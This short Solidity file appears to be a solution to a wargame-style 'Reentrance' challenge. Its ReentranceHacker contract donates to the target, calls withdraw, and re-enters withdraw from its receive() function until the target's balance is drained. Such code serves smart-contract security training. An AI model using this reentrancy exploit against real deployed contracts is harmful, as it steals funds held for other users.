pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";
import {Test, console2} from "forge-std/Test.sol";

contract ReentranceHacker {
    //uint256 constant PAY_ONCE = 1000000000000;
    Reentrance immutable reentrance;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function hack() public payable {
        reentrance.donate{value: msg.value}(payable(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance != 0) {
            reentrance.withdraw(msg.value);
        }
    }
}
